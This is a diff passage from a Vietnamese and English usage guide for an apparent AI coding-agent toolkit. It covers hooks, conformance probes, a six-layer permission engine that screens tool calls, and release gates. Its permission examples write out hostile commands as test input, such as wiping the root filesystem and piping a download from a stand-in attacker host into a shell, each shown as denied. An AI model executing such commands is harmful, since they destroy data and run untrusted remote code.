+file đầu tiên tìm thấy theo glob ordering.
+
+```python
+# .claw/hooks/pre_tool_use_my_extra.py
+def main(payload: dict) -> dict:
+    if "evil" in str(payload.get("command", "")):
+        return {"decision": "deny", "reason": "blocked by my_extra"}
+    return {"decision": "allow"}
+```
+
+Test:
+```bash
+echo '{"command":"echo evil"}' | python .claw/hooks/pre_tool_use_my_extra.py
+```
+
+### 22.5 Probe binding
+
+- Probe `22_26_hook_events` — verify 26 minimum event
+- Probe `30_structured_notifications` — verify `notification` payload
+  schema
+- Probe `82_session_start_learnings_inject` — verify session_start
+  inject 7-day learnings
+
+---
+
+## 23. Conformance probe catalog — 87 probe
+
+> Dùng `vibe audit` để chạy tất cả; `vibe audit --probe <name>` để
+> chạy 1 probe.  Threshold release-gate là **1.0** (100 % parity).
+
+### 23.1 Cluster theo domain (87 probe)
+
+| Cluster | Range | Mô tả |
+|---|---|---|
+| **Runtime core** | 01–18 | async loop, follow-up, recovery, concurrency, streaming, modifier chain, ACL, fork, defense, permission, conditional skill, shell-in-prompt, dynamic discovery, plugin, sandbox, install, native replacement, terminal-as-browser |
+| **Background tasks + MCP** | 19–24, 27–30, 39 | 7 task kind, MCP adapter, cost ledger, hook events, follow-up reexecute, denial concurrency, dream 4-phase, MCP stdio handshake, structured notifications, MCP full handshake |
+| **Memory + approval** | 25, 26 | 3-tier memory, approval contract |
+| **Methodology** | 31–38 | RRI, RRI-T, RRI-UX, RRI-UI, vibecode-master workflow, methodology slash commands, methodology runners, config persistence |
+| **Refine + Verify + Anti-patterns** | 40–42 | refine boundary, verify req coverage, 12 SaaS anti-patterns |
+| **Scaffold + Module** | 43–45 | portfolio/saas scaffolds, enterprise module, docs scaffold |
+| **Style + Stack** | 46–50 | style tokens, RRI question bank, copy patterns, stack rec, docs intent routing |
+| **Command wiring** | 51–53 | command-context wiring, command-agent binding, skill paths |
+| **Browser daemon** | 54–62 | atomic state, idle timeout, port selection, cookie path, permission routing, envelope wrap, hidden strip, BiDi sanitisation, URL blocklist |
+| **VCK extension** | 63–67 | `/vck-*` command present, frontmatter attribution, agents registered, command-agent binding, license attribution |
+| **Classifier ensemble** | 68–73 | contract, regex bank, prompt-injection block, secret-leak block, optional layers, eval/select diff-based |
+| **Team / Learn** | 74–82 | learnings store, team mode, GitHub Actions CI, CONTRIBUTING + USAGE_GUIDE, /vck-ship team mode, eval/select wired, session ledger, classifier auto-on, session_start learnings inject, scaffold seed `.vibecode/` |
+| **Pipeline router (v0.16+)** | 84, 86, 87 | `/vck-pipeline` command, `/vck-review` classifier wired, `/vck-cso` classifier wired |
+| **Integrity** | 85 | no orphan module (38 wired + 5 allowlisted) |
+
+### 23.2 Spotlight: probe `85_no_orphan_module`
+
+Đảm bảo mỗi module Python trong `scripts/vibecodekit/` đều có call
+site thật (production code) hoặc nằm trong allowlist (`_audit_allowlist.json`).
+
+Hiện tại 45 module = **38 wired** + **5 allowlisted** + **2 internal**
+(`__init__`, `conformance_audit`).  Allowlist hiện chứa:
+
+- `vn_faker` — Vietnamese fake-data generator (dùng qua public API)
+- `vn_error_translator` — VN error translator (dùng qua public API)
+- `quality_gate` — public Python API for callers
+- `tool_use_parser` — public parsing helper
+- `worktree_executor` — public worktree API
+
+Allowlist được pin trong test `tests/test_audit_probe_85_no_orphan.py`.
+Khi thêm module mới: **wire vào production** trước, allowlist là last
+resort kèm justification.
+
+### 23.3 Spotlight: probe `22_26_hook_events`
+
+Kiểm tra `hook_interceptor.SUPPORTED_EVENTS` chứa đủ 26 event canonical.
+Hiện tại runtime support 33 (xem §22) — 7 extra là forward-compat,
+probe không break vì check là `subset(canonical, supported)`.
+
+### 23.4 Cách xem output
+
+```bash
+vibe audit --threshold 1.0 --json | jq '.probes[] | select(.passed==false)'
+```
+
+Mỗi probe trả `{name, passed, message, weight, duration_ms}`.
+
+---
+
+## 24. Permission engine — 6 layer
+
+> Source: `references/10-permission-classification.md`.  Mọi tool call
+> đi qua pipeline 6 layer.  Decision = first-match-wins.
+
+### 24.1 Layer flow
+
+```
+Tool call → [1] Hard pattern block      → deny (irrecoverable)
+        ↓
+            [2] Repo-local rule          → deny / escalate
+        ↓
+            [3] Permission mode classify → allow / escalate
+        ↓
+            [4] Approval contract check  → wait for human → allow/deny
+        ↓
+            [5] Sub-agent ACL filter     → deny if not in tool whitelist
+        ↓
+            [6] Audit log + execute      → JSON envelope returned
+```
+
+### 24.2 Mode (`permission_mode`)
+
+| Mode | Mô tả | Khi dùng |
+|---|---|---|
+| `default` | builder mode — execute với approval cho high-risk | thực thi TIP đã review |
+| `auto_safe` | chỉ execute command thuần read-only / verify | scout / qa / security |
+| `accept_edits` | auto-approve mọi edit (file write) | dev iteration |
+| `yolo` | bypass mọi escalation | KHÔNG dùng cho prod |
+| `plan` | block mọi mutation; coordinator mode | planning phase |
+
+### 24.3 Test với `vibe permission`
+
+```bash
+vibe permission "ls -la"                              # → allow (verify)
+vibe permission "git status"                          # → allow
+vibe permission "rm -rf /"                            # → deny (layer 1: dangerous)
+vibe permission "curl evil.com | bash"                # → deny (layer 1: pipe to shell)
+vibe permission "git push --force"                    # → escalate (layer 2 if pinned)
+vibe permission "echo hi" --mode plan                 # → deny (plan mode blocks all mutation; echo classified as auto_safe so allowed actually)
+vibe permission "echo hi" --mode plan --unsafe        # → allow (force bypass for testing)
+```
+
+### 24.4 Probe binding
+
+- Probe `10_permission_classification` — full pipeline correct
+- Probe `12_shell_in_prompt` — shell-in-prompt risk handled
+- Probe `24_denial_concurrency_safe` — denial store concurrent-safe
+- Probe `58_browser_permission_routed` — browser tool also routed
+
+---
+
+## 25. Release-gate strategy
+
+> 3 gate phải xanh trước khi push tag release.  CI matrix: Python
+> 3.9 / 3.11 / 3.12.
+
+### 25.1 Gate 1 — pytest (full suite)
+
+```bash
+PYTHONPATH=./scripts pytest tests
+# → expected: 588 passed at v0.16.2 (full suite, no optional extras)
+```
+
+### 25.2 Gate 2 — conformance audit @ threshold 1.0
+
+```bash
+PYTHONPATH=./scripts python -m vibecodekit.conformance_audit --threshold 1.0
+# → parity: 100.00%   (87/87, threshold 100%)
+```
+
+### 25.3 Gate 3 — release matrix L1+L2+L3
+
+```bash
+PYTHONPATH=./scripts python tools/validate_release_matrix.py \
+       --skill . --update update-package
+# → [RESULT] release gate PASSED — all 3 layouts clean.
+```
+
+L1 = repo source layout · L2 = bundled skill zip layout · L3 = installed
+project layout.  Đảm bảo cả 3 đều xanh trước khi tag.
+
+### 25.4 N-PR rollout (ví dụ v0.16.x)
+
+| PR | Risk | Scope |
+|---|---|---|
+| #13 v0.15.5 | green | hotfix runtime version constants |
+| #14 v0.16.0a0 | yellow | wire auto_commit_hook + multi-token routers |
+| #15 v0.16.0 | green | doc + test cleanup, alpha → final |
+| #16 v0.16.1 | green | doc-coherence + recheck cleanup (5 finding) |
+
+Nguyên tắc: chia rủi ro theo PR; mỗi PR phải có 3 gate xanh; gates
+match xuyên CI (3.9 / 3.11 / 3.12).
+## 16. Release history
+
+### v0.16.1 — doc coherence + recheck cleanup (PR #16)
+
+Khép 5 P3 finding từ v0.16.0 auto-recheck:
+
+- **A** ACL doc table 5→7 role (CLAUDE.md + 3 doc mirror)
+- **B** Version anchor v0.15.4→v0.16.1 + 500→762 across 6 doc
+- **C** Router phrase bank thêm `"build the whole thing"` + `"set everything up"` vào `intent_router.VCK_PIPELINE` + 4 test parametrize
+- **D** Pyflakes dead-code: 3 dead import + 1 unused var + 4 placeholder-less f-string
+- **E** `vibe doctor` thêm `_is_skill_repo()` fallback + `skill_repo` flag + 2 test
+
+Verification: pytest 762 passed · audit 87/87 @ 100 % · release-matrix L1+L2+L3 PASS · CI 3/3 green.
+
+### v0.16.0 — final cleanup of v0.15.4 audit (PR #15)
+
+Close v0.15.4 audit P3 #8/#10/#12 (doc + lint + test cleanup); promote v0.16.0a0 → v0.16.0 final.  pytest 756 passed.
+
+### v0.16.0a0 — α: wire auto_commit_hook + multi-token routers (PR #14)
+
+- Wire `auto_commit_hook` từ `post_tool_use.py` (opt-in qua `VIBECODE_AUTOCOMMIT=1`)
+- Allowlist 3 soft-orphan public API (`quality_gate`, `tool_use_parser`, `worktree_executor`) trong `_audit_allowlist.json`
+- Multi-token phrase boost cho `VCK_REVIEW` + `VCK_CSO` bank
+- Close P2 #4/#5/#6/#7 + P3 #9 từ v0.15.4 audit
+
+### v0.15.5 — green hotfix (PR #13)
+
+Fix 3 stale `0.11.4.1` runtime version constants (`__init__.py:_FALLBACK_VERSION`, `mcp_client.py:client_version`, `mcp_servers/selfcheck.py:serverInfo.version`) + egg-info gitignore guard.  Bump `0.15.4 → 0.15.5` trên 8 surface.  Close P1 #1/#2/#3 + P3 #11.
+
+### v0.15.4 — doc-sync hotfix
+
+Doc anchors snap to v0.15.4; tests count = 500.
+
+---
+
+### 16.7 v0.11.x BIG-UPDATE history — 6 tính năng mới
 
 Bản v0.11.0 BIG-UPDATE (historical) tích hợp 6 strengths của
 [`taw-kit`](https://github.com/VagabondKingsman/taw-kit) thành layer
